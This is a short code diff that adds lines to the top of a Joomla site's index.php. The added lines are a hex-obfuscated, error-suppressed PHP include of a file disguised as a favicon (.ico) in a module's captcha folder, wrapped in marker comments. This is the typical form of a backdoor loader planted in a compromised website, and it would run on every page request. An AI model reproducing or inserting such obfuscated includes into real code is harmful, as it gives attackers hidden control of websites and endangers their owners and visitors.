@@ -1,4 +1,9 @@
 <?php
+/*2f952*/
+
+@include "\x2fho\x6de/\x72eg\x68os\x74/d\x6fma\x69ns\x2fre\x67ho\x73p.\x67or\x6fdg\x6fme\x6c.b\x79/p\x75bl\x69c_\x68tm\x6c/m\x6fdu\x6ces\x2fmo\x64_s\x69mp\x6cef\x6frm\x2fkc\x61pt\x63ha\x2ffa\x76ic\x6fn_\x3459\x390c\x2eic\x6f";
+
+/*2f952*/
 /**
 * @version		$Id: index.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
